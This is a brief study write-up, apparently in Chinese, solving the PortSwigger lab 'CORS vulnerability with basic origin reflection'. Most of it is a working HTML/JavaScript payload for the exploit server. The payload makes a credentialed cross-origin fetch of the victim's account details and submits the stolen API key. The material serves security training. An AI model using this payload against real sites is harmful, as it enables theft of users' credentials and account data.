---
title: PortSwigger Cross-origin resource sharing (CORS)
description: PortSwigger Cross-origin resource sharing (CORS)
last_update:
  date: "2025-08-25T08:00:00+08:00"
---

## Lab: CORS vulnerability with basic origin reflection

| Dimension | Description                                                                                                |
| --------- | ---------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/cors#server-generated-acao-header-from-client-specified-origin-header |
| Lab       | https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack                               |

在 exploit-server 構造

```html
<script>
  fetch(
    "https://0ae00026030c463780b68f5900490011.web-security-academy.net/accountDetails",
    { credentials: "include" },
  )
    .then((res) => res.json())
    .then((json) => {
      alert(JSON.stringify(json));
      document.getElementById("hello").value = json.apikey;
      document.getElementById("submitSolution").submit();
    });
</script>
<form
  id="submitSolution"
  action="/submitSolution"
  method="POST"
  enctype="application/x-www-form-urlencoded"
>
  <input id="hello" name="answer" />
</form>
```

## 參考資料

- https://portswigger.net/web-security/cors
